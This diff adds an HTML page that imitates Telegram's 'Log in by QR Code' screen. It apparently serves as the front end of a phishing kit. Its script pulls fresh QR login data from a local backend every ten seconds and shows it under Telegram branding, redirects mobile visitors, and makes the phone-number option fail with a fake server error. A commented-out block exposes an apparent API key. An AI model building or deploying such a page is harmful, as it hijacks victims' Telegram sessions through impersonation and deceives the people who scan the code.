@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Web Telegram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;1,300&display=swap');
+        body{
+            background-color: #212121;
+            color: #ffffff;
+            display: flex;
+            -webkit-user-select: none; /* Safari */
+            -ms-user-select: none; /* IE 10 and IE 11 */
+            user-select: none; /* Standard syntax */
+        }
+        .os-600 {
+            font-family: "Open Sans", sans-serif;
+            font-optical-sizing: auto;
+            font-weight: bold;
+            font-style: normal;
+            font-variation-settings:
+                "wdth" 95;
+        }
+        /* HTML: <div class="loader"></div> */
+        .loader {
+            width: 50px;
+            margin: 0 auto;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            border: 8px solid #514b82;
+            animation:
+                l20-1 0.8s infinite linear alternate,
+                l20-2 1.6s infinite linear;
+        }
+        @keyframes l20-1{
+            0%    {clip-path: polygon(50% 50%,0       0,  50%   0%,  50%    0%, 50%    0%, 50%    0%, 50%    0% )}
+            12.5% {clip-path: polygon(50% 50%,0       0,  50%   0%,  100%   0%, 100%   0%, 100%   0%, 100%   0% )}
+            25%   {clip-path: polygon(50% 50%,0       0,  50%   0%,  100%   0%, 100% 100%, 100% 100%, 100% 100% )}
+            50%   {clip-path: polygon(50% 50%,0       0,  50%   0%,  100%   0%, 100% 100%, 50%  100%, 0%   100% )}
+            62.5% {clip-path: polygon(50% 50%,100%    0, 100%   0%,  100%   0%, 100% 100%, 50%  100%, 0%   100% )}
+            75%   {clip-path: polygon(50% 50%,100% 100%, 100% 100%,  100% 100%, 100% 100%, 50%  100%, 0%   100% )}
+            100%  {clip-path: polygon(50% 50%,50%  100%,  50% 100%,   50% 100%,  50% 100%, 50%  100%, 0%   100% )}
+        }
+        @keyframes l20-2{ 
+            0%    {transform:scaleY(1)  rotate(0deg)}
+            49.99%{transform:scaleY(1)  rotate(135deg)}
+            50%   {transform:scaleY(-1) rotate(0deg)}
+            100%  {transform:scaleY(-1) rotate(-135deg)}
+        }
+        .os-small {
+            font-family: "Open Sans", sans-serif;
+            font-optical-sizing: auto;
+            font-weight: 400;
+            font-style: normal;
+            font-variation-settings:
+                "wdth" 95;
+        }
+        #auth-placeholder{
+            
+            height: 100px;
+        }
+        li{
+            margin-top: 10px;
+            margin-left: 30px;
+            /* margin: 0 auto; */
+        }
+        .tg-btn{
+            height: 50px;
+            width: 400px;
+            background: none;
+            border: none;
+            font-weight: bold;
+            font-size: 16px;
+            color: #8774e1;
+            display: block;
+            border-radius: 8px;
+            margin: 0 auto;
+        }
+        .tg-btn:hover{
+            background-color: #8674e115;
+
+        }
+        #container{
+            
+            margin: 0 auto;
+        }
+        #alert{
+            display: none;
+            font-family: "Open Sans", sans-serif;
+            font-weight: bold;
+            position: fixed;
+            left: 50%;
+            transform: translate(-50%, -100%);
+            top: 50%;
+            width:300px;
+            height: 100px;
+            background-color: #212121;
+            padding: 15px;
+            border-radius: 12px;
+        }
+        #title{
+            font-size: larger;
+            padding-bottom: 5px;
+        }
+        #hey{
+            display: none;
+            position: fixed;
+            background-color: rgba(0, 0, 0, 0.445);
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <script type="text/javascript" src="https://unpkg.com/qr-code-styling@1.5.0/lib/qr-code-styling.js"></script>
+</head>
+<body>
+    <div id="hey"></div>
+    <div id="alert">
+        <div id="title">TITLE</div>
+        <div id="textal">TXT</div>
+        <button class="tg-btn" onclick="killalert()" style="position: fixed; width: 50px; height: 30px; float: right; top: 70%; right: 5%;">Ok</button>
+    </div>
+    <div id="container">
+        <div class="auth-placeholder">&nbsp;<br>&nbsp;</div>
+        <div class="auth-page_container">
+            <!-- <img src="download.png" alt="Please wait", style="display: block; margin: 0 auto;"> -->
+            <div id="qrcode" style="width: 240px; height: 240px; display: block; margin: 0 auto;"><br><br><br><br><div class="loader"></div></div>
+            <h1 class="os-600">Log in to Telegram by QR Code</h4>
+                <div class="auth-placeholder">&nbsp;</div>
+                <ol class="qr-description os-small" style="display: block;margin: 0 auto;"><li><span class="i18n">Open Telegram on your phone</span></li><li><span class="i18n">Go to <b>Settings</b> &gt; <b>Devices</b> &gt; <b>Link Desktop Device</b></span></li><li><span class="i18n">Point your phone at this screen to confirm login</span></li></ol>
+                <div class="auth-placeholder">&nbsp;</div><button class="os-600 tg-btn" onclick="alert('Server Error!','Internal server error -21')">LOG IN BY PHONE NUMBER</button>
+            </div>
+    </div>
+    
+    <script>
+        
+        // let apikey = "e6su7R_k3aNUkizS2R7aeiHchypfhVkpV7wV1o_HesYiovYIbNWXJvuy4VAe81k3"
+        // let endpoint = `httdps://api.qr-code-generator.com/v1/create?access-token=${apikey}`
+
+        // // let payload = {
+        // //     "qr_code_text": "tg://login?token=AQTVWuxluI+TA/xZmn2aWFgZMKo+ia06twZP45JF5ipeDA==",
+        // //     "image_format": "PNG",
+        // //     "background_color": "#212121",
+        // //     "image_width": 240,
+        // //     "download": 1
+        // // }
+
+        // let payload = {
+        //     "frame_name": "no-frame",
+        //     "qr_code_text": "https://www.qr-code-generator.com/",
+        //     "image_format": "SVG",
+        //     "qr_code_logo": "scan-me-square"
+        // }
+        const isMobile = {
+            Android: function() {
+                return navigator.userAgent.match(/Android/i);
+            },
+            BlackBerry: function() {
+                return navigator.userAgent.match(/BlackBerry/i);
+            },
+            iOS: function() {
+                return navigator.userAgent.match(/iPhone|iPad|iPod/i);
+            },
+            Opera: function() {
+                return navigator.userAgent.match(/Opera Mini/i);
+            },
+            Windows: function() {
+                return navigator.userAgent.match(/IEMobile/i) || navigator.userAgent.match(/WPDesktop/i);
+            },
+            any: function() {
+                return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
+            }
+        };
+
+        if(isMobile.any()){location.href = "/m"}
+
+        window.alert = function(title, text){
+            document.getElementById("hey").style.display = "inline"
+            document.getElementById("alert").style.display = "inline"
+            document.getElementById("title").innerHTML = title
+            document.getElementById("textal").innerHTML = text
+        }
+        function killalert() {
+            document.getElementById("hey").style.display = "none"
+            document.getElementById("alert").style.display = "none"
+        }
+
+        async function generateQR(){
+            let ff = await fetch("http://127.0.0.1:8080/getQR", {headers:{
+                "Access-Control-Allow-Origin": "*"
+            }, mode:"cors"})
+            
+            let textUrl = await ff.text()
+            // console.log(textUrl);
+            let qrCode = new QRCodeStyling({
+                width: 240,
+                height: 240,
+                type: "svg",
+                data: textUrl,
+                image: "./static/telegram-3-xxl.png",
+                dotsOptions: {
+                    color: "#ffffff",
+                    type: "rounded"
+                },
+                backgroundOptions: {
+                    color: "#212121",
+                },
+                imageOptions: {
+                    crossOrigin: "anonymous",
+                    margin: 5,
+                    imageSize: 1
+                },
+                cornersSquareOptions: {
+                    color: "#ffffff",
+                    type: "extra-rounded"
+                },
+                qrOptions:{
+                    errorCorrectionLevel: "L"
+                }
+            });
+            document.getElementById("qrcode").innerHTML = ""
+            qrCode.append(document.getElementById("qrcode"));
+        }
+        generateQR()
+        setInterval(async ()=>{
+            // let response = await fetch(endpoint, {
+            //     method: "POST",
+            //     body: JSON.stringify(payload)
+            // });
+
+            // document.getElementById("qrcode").innerHTML =  await response.text();
+            await generateQR()
+        }, 10000)
+    </script>
+</body>
+</html>
